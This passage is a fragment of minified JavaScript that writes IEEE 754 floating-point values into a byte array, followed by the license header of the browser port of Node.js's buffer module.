s,a,c,l=8*o-i-1,u=(1<<l)-1,h=u>>1,d=23===i?Math.pow(2,-24)-Math.pow(2,-77):0,f=n?0:o-1,p=n?1:-1,g=t<0||0===t&&1/t<0?1:0;for(t=Math.abs(t),isNaN(t)||t===1/0?(a=isNaN(t)?1:0,s=u):(s=Math.floor(Math.log(t)/Math.LN2),t*(c=Math.pow(2,-s))<1&&(s--,c*=2),(t+=s+h>=1?d/c:d*Math.pow(2,1-h))*c>=2&&(s++,c/=2),s+h>=u?(a=0,s=u):s+h>=1?(a=(t*c-1)*Math.pow(2,i),s+=h):(a=t*Math.pow(2,h-1)*Math.pow(2,i),s=0));i>=8;e[r+f]=255&a,f+=p,a/=256,i-=8);for(s=s<<i|a,l+=i;l>0;e[r+f]=255&s,f+=p,s/=256,l-=8);e[r+f-p]|=128*g},
/*!
 * The buffer module from node.js, for the browser.
 *
 * @author   Feross Aboukhadijeh <https://feross.org>
 * @license  MIT
 */